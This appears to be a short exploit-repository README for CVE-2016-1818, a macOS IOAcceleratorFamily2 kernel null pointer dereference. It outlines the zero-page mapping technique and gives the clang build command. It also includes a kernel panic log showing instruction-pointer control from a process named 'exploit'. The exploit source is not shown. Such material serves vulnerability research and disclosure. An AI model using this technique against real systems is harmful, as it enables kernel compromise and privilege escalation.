# CVE-2016-1818

- Null pointer Dereference
- Allocated memory at 0x0000000
  - vm_allocate.
  - 32bit binary
- clang exploit.c -o exploit -framework IOKit -m32 -Wl,-pagezero_size,0 -w


```
panic(cpu 6 caller 0xffffff801a7cc34a): Kernel trap at 0x0000000020160215, type 14=page fault, registers:
CR0: 0x0000000080010033, CR2: 0x0000000020160215, CR3: 0x000000000a67b0b1, CR4: 0x00000000001627e0
RAX: 0x000000007aad1400, RBX: 0xffffff8044c964b4, RCX: 0x0000000000000000, RDX: 0x000000000544f74b
RSP: 0xffffff921986b9a8, RBP: 0xffffff921986bb10, RSI: 0xffffff7f9d125198, RDI: 0x000000007aad1400
R8:  0x0000000000000000, R9:  0xffffff8044c964b4, R10: 0xffffff80450885fc, R11: 0x0000000000000000
R12: 0x0000000000000000, R13: 0xffffff80448c1000, R14: 0x0000000000000000, R15: 0x0000000000000000
RFL: 0x0000000000010206, RIP: 0x0000000020160215, CS:  0x0000000000000008, SS:  0x0000000000000010
Fault CR2: 0x0000000020160215, Error code: 0x0000000000000010, Fault CPU: 0x6, PL: 0

Backtrace (CPU 6), Frame : Return Address
0xffffff921986b630 : 0xffffff801a6d8b52 
0xffffff921986b6b0 : 0xffffff801a7cc34a 
0xffffff921986b890 : 0xffffff801a7ea253 
0xffffff921986b8b0 : 0x20160215 
0xffffff921986bb10 : 0xffffff7f9c9af1f2 
0xffffff921986bba0 : 0xffffff7f9c9afebb 
0xffffff921986bbe0 : 0xffffff801acdd137 
0xffffff921986bd20 : 0xffffff801a795c10 
0xffffff921986be30 : 0xffffff801a6dd2c3 
0xffffff921986be60 : 0xffffff801a6c08f8 
0xffffff921986bea0 : 0xffffff801a6d06a5 
0xffffff921986bf10 : 0xffffff801a7b6915 
0xffffff921986bfb0 : 0xffffff801a7ea828 
      Kernel Extensions in backtrace:
         com.apple.iokit.IOAcceleratorFamily2(205.3)[1B6944F0-F0F4-3D26-892C-46EB6C5C7433]@0xffffff7f9c991000->0xffffff7f9c9fcfff
            dependency: com.apple.iokit.IOPCIFamily(2.9)[D6409E97-2129-3BF1-BBB4-B726717D60F7]@0xffffff7f9af2c000
            dependency: com.apple.iokit.IOGraphicsFamily(2.4.1)[172C2960-EDF5-382D-80A5-C13E97D74880]@0xffffff7f9b30f000

BSD process name corresponding to current thread: exploit
```

